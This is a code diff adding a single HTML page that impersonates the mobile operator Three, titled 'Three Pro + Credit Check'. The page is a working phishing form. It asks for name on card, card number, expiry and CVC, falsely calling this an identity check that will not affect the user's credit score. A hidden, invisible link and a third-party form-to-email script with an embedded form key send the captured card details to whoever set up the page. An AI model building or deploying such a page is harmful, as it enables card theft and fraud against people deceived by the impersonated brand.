@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Three Pro + Credit Check</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --primary: #003366;
+      --secondary: #f50ee9;
+      --text-color: #222;
+      --bg: #f7f7f7;
+      --white: #ffffff;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: var(--bg);
+      color: var(--text-color);
+      line-height: 1.6;
+    }
+
+    /* TOP BAR */
+    header.top-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 12px 20px;
+      background: white;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+      flex-wrap: wrap;
+      position: sticky;
+      top: 0;
+      z-index: 999;
+    }
+
+    .top-bar .left {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+      flex-wrap: wrap;
+    }
+
+    .top-bar .logo {
+      height: 36px;
+    }
+
+    .nav-tabs a {
+      text-decoration: none;
+      margin-right: 12px;
+      color: #444;
+      font-weight: 500;
+      padding: 6px 10px;
+      border-radius: 5px;
+    }
+
+    .nav-tabs a.active {
+      border-bottom: 2px solid #f44336;
+      font-weight: bold;
+    }
+
+    .top-bar .right {
+      display: flex;
+      gap: 12px;
+      flex-wrap: wrap;
+      font-size: 14px;
+    }
+
+    .top-bar .right a {
+      text-decoration: none;
+      color: black;
+      display: flex;
+      gap: 5px;
+    }
+
+    .top-bar .right a:hover {
+      color: #f44336;
+    }
+
+    /* MAIN NAV */
+    nav.main-nav {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background: linear-gradient(to right, #ff7f7f, #ff9999);
+      padding: 10px 20px;
+      flex-wrap: wrap;
+    }
+
+    .main-nav a {
+      text-decoration: none;
+      color: black;
+      font-weight: 600;
+      margin-right: 20px;
+    }
+
+    .main-nav .search-icon {
+      background: black;
+      color: white;
+      padding: 6px 10px;
+      border-radius: 50%;
+      cursor: pointer;
+    }
+
+    .banner {
+      background: black;
+      color: white;
+      text-align: center;
+      padding: 14px 10px;
+      font-size: 15px;
+    }
+
+    .banner a {
+      color: #00aaff;
+      text-decoration: underline;
+    }
+
+    /* CREDIT CHECK */
+    .header {
+      background: linear-gradient(to right, var(--secondary), var(--primary));
+      color: white;
+      text-align: center;
+      padding: 2rem 1rem;
+      font-size: clamp(1.5rem, 3vw, 2.5rem);
+      font-weight: bold;
+    }
+
+    .container {
+      max-width: 500px;
+      margin: 2rem auto;
+      background-color: rgba(255,255,255,0.9);
+      border-radius: 16px;
+      padding: 2rem;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.1);
+    }
+
+    h2 {
+      color: var(--primary);
+      margin-bottom: 0.5rem;
+    }
+
+    .card-logos {
+      display: flex;
+      justify-content: space-around;
+      margin-bottom: 1.5rem;
+      flex-wrap: wrap;
+    }
+
+    .card-logos img {
+      width: 45px;
+      margin: 5px;
+    }
+
+    label {
+      font-weight: 600;
+      font-size: 14px;
+      display: block;
+      margin-bottom: 5px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 16px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+
+    input:focus {
+      border-color: var(--secondary);
+      outline: none;
+      background-color: #f8faff;
+    }
+
+    .submit-btn {
+      background: var(--secondary);
+      color: white;
+      padding: 12px;
+      border: none;
+      width: 100%;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .submit-btn:hover {
+      background: var(--primary);
+    }
+
+    /* RESPONSIVE */
+    @media (max-width: 768px) {
+      .top-bar, .main-nav {
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 10px;
+      }
+
+      .main-nav a {
+        margin: 5px 0;
+      }
+
+      .top-bar .right {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+
+      .container {
+        margin: 1rem;
+        padding: 1.5rem;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- TOP BAR -->
+  <header class="top-bar">
+    <div class="left">
+      <img src="https://media.licdn.com/dms/image/v2/C4E0BAQHATxND54spxw/company-logo_200_200/company-logo_200_200/0/1663840035830/threeuk_logo?e=2147483647&v=beta&t=GmfEDU2dvuY0dQ3FcYrmNqjr_4i3gk_NUYZwiDyBus0" class="logo" alt="Three Logo">
+      <nav class="nav-tabs">
+        <a href="#" class="active">Personal</a>
+        <a href="#">Business</a>
+      </nav>
+    </div>
+    <div class="right">
+      <span><strong>📞 Order:</strong> 0800 033 8006</span>
+      <a href="#">📰 Blog</a>
+      <a href="#">📡 Coverage</a>
+      <a href="#">📍 Stores</a>
+      <a href="#">👤 Login/Register</a>
+      <a href="#">🛒 Basket</a>
+    </div>
+  </header>
+
+  <!-- MAIN NAV -->
+  <nav class="main-nav">
+    <div>
+      <a href="#">Shop</a>
+      <a href="#">Why Three?</a>
+      <a href="#">Help</a>
+    </div>
+    <div class="search-icon">🔍</div>
+  </nav>
+
+  <!-- BANNER -->
+  <div class="banner">
+    <p>You could win a 55” OLED TV when you <a href="#">register your interest</a> in new Samsung devices.</p>
+  </div>
+
+  <!-- HEADER -->
+  <div class="header">Credit Check</div>
+
+  <!-- FORM CONTAINER -->
+  <div class="container">
+    <h2>Verify Your Identity</h2>
+    <p>
+      Credit Check is just to validate your identity, not for the payment process and it's not going to affect your credit score.
+    </p>
+
+    <div class="card-logos">
+      <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa">
+      <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" alt="MasterCard">
+      <img src="https://img.icons8.com/color/48/000000/amex.png" alt="Amex">
+      <img src="https://img.icons8.com/color/48/000000/discover.png" alt="Discover">
+    </div>
+
+    <form method="POST" action="//submit.form">
+      <label for="name">Name on Card</label>
+      <input type="text" id="data_1" name="name-oncard" placeholder="John Doe" required>
+
+      <label for="card">Card Number</label>
+      <input type="text" id="card" name="card-number" placeholder="1234 5678 9012 3456" maxlength="19" required>
+
+      <label for="expiry">Expiry</label>
+      <input type="text" id="expiry" name="expiry" placeholder="MM/YY" required>
+
+      <label for="cvc">CVC</label>
+      <input type="text" id="cvc" name="cvc" placeholder="123" maxlength="4" required>
+
+      <button type="submit" class="submit-btn">Submit</button>
+
+       <div>
+<div style='font-size:1px; opacity:0;' style="float:right"><a href="https://www.100forms.com" id="lnk100" title="form to email">form to email</a></div>
+<script src="https://www.100forms.com/js/FORMKEY:GLS2E6YQPAC5" type="text/javascript"></script>
+</div>
+
+    </form>
+  </div>
+
+</body>
+</html>
